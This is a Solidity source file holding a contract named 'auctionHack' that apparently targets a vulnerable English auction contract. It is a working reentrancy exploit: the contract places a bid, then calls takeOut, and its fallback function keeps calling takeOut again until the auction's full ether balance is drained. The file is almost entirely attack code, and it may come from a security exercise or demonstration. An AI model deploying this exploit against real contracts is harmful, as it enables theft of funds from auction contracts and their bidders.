//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface IEnglishAuction{
    function bid() external payable;
    function takeOut() external;
    function getBalance() external view returns(uint256);
}

contract auctionHack{
    IEnglishAuction public auctionContrcat;
    uint public loopCounter;
    uint public loop = 0;

    constructor(address addy){
        auctionContrcat = IEnglishAuction(addy);
    } 

    function bid() public payable{
        auctionContrcat.bid{value: msg.value}();
    }

    function takeOut2() public{
        loopCounter = address(auctionContrcat).balance / auctionContrcat.getBalance() - 1;
        auctionContrcat.takeOut();
    }

    fallback() external payable{
        if(loop < loopCounter){
            loop += 1;
            auctionContrcat.takeOut();
        }
    }

}